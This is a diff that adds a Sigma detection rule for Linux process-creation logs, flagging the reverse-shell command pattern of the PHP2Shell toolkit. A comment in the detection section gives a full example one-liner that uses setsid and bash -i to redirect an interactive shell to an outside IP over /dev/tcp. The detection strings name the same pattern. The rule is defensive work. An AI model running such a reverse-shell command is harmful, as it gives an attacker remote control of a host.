@@ -1,0 +1,32 @@
+title: PHP2Shell Toolkit Reverse Shell Execution
+id: 597a7318-62a2-4752-9b2f-7c1825b290df
+status: experimental
+description: Detects the specific reverse shell command line pattern used by the PHP2Shell toolkit, which includes creating a lock file in /tmp, using setsid to detach the process, and initiating an interactive bash shell redirected to a TCP socket.
+references:
+    - https://socradar.io/blog/php2shell-ai-agents-credential-harvesting/
+author: ioc-yara-daily (agentic)
+date: 2026-11-20
+tags:
+    - attack.execution
+    - attack.t1059.004
+    - attack.command_and_control
+    - attack.t1071.001
+    - detection.threat_hunting
+logsource:
+    category: process_creation
+    product: linux
+detection:
+    selection:
+        Image|endswith:
+            - '/sh'
+            - '/bash'
+        CommandLine|contains|all:
+            # Example: [ -e /tmp/.c<id> ] || { >/tmp/.c<id>; setsid bash -c 'bash -i >&/dev/tcp/206.245.153.56/<port> 0>&1' & }
+            - '/tmp/.c'
+            - 'setsid'
+            - 'bash -i'
+            - '>&/dev/tcp/'
+    condition: selection
+falsepositives:
+    - Highly specific combination of elements; false positives are unlikely.
+level: high
